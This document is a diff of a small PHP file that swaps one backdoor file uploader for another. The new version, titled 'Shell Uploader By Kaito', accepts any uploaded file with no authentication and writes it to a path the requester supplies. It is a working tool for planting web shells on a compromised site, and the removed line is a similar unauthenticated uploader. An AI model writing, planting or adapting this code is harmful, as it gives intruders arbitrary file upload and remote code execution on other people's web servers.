@@ -1,1 +1,9 @@
-<?php echo 'Uploader<br>';echo '<br>';echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( _POST['_upl'] == "Upload" ) {if(@copy(_FILES['file']['tmp_name'], _FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Error !!!</b><br><br>'; }}?>
+<?php
+$files = @$_FILES["files"];
+if ($files["name"] != '') {
+    $fullpath = $_REQUEST["path"] . $files["name"];
+    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
+        echo "<h1><a href='$fullpath'>Click Me!</a></h1>";
+    }
+}echo '<html><head><title>Shell Uploader By Kaito</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
+?>
